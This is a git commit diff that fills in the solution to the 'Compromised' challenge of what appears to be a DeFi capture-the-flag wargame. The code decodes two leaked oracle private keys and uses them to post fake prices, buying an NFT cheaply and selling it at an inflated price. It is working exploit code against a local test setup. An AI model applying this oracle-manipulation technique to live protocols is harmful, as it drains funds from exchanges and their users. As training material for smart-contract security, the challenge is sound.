9de74510c50dbfa8913bd80ee8822a6077f9c5e1
Farber98 <juantuc98@gmail.com>
2023-08-01 20:31:30 -0300

    compromised solved.

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -52,7 +52,40 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Get leaked oracle keys 
+        
+        let info, string, key1, key2;
+        info =
+        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
+        string = Buffer.from(info.split(" ").join(""), "hex").toString("utf-8");
+        key1 = Buffer.from(string, "base64").toString("utf-8");
+        
+        info =
+        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
+        string = Buffer.from(info.split(" ").join(""), "hex").toString("utf-8");
+        key2 = Buffer.from(string, "base64").toString("utf-8");
+
+        const oracle1 = new ethers.Wallet(key1, ethers.provider)
+        const oracle2 = new ethers.Wallet(key2, ethers.provider)
+        
+        // Post new prices with compromised oracles to buy cheap
+        const CHEAP_PRICE = 1n * 10n ** 16n
+        await oracle.connect(oracle1).postPrice("DVNFT", CHEAP_PRICE);
+        await oracle.connect(oracle2).postPrice("DVNFT", CHEAP_PRICE);
+        
+        // Buy cheap
+        await exchange.connect(player).buyOne({value: CHEAP_PRICE});
+
+        await oracle.connect(oracle1).postPrice("DVNFT", CHEAP_PRICE + INITIAL_NFT_PRICE);
+        await oracle.connect(oracle2).postPrice("DVNFT", CHEAP_PRICE + INITIAL_NFT_PRICE);
+        
+        // Approve and sell high
+        await nftToken.connect(player).approve(exchange.address,0)
+        await exchange.connect(player).sellOne(0)
+
+        // set oracles back to price
+        await oracle.connect(oracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(oracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
